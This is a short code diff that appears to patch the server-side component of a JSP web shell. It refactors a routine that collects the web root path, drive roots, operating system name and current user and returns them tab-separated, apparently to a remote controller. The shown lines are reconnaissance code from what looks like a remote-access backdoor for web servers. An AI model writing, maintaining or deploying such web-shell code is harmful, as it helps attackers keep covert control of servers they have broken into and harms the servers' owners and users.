@@ -103,8 +103,7 @@ Ver:1.3
             return ret;
         }
 
-        String WwwRootPathCode(HttpServletRequest r) throws Exception {
-            String d = this.getClass().getResource("/").getPath();
+        String WwwRootPathCode(String d) throws Exception {
             String s = "";
             if (!d.substring(0, 1).equals("/")) {
                 File[] roots = File.listRoots();
@@ -278,7 +277,7 @@ Ver:1.3
             String serverInfo = (String)System.getProperty("os.name");
             String separator = File.separator;
             String user = (String)System.getProperty("user.name");
-            String driverlist = WwwRootPathCode(r);
+            String driverlist = WwwRootPathCode(d);
             return d + "\t" + driverlist + "\t" + serverInfo + "\t" + user;
         }
 
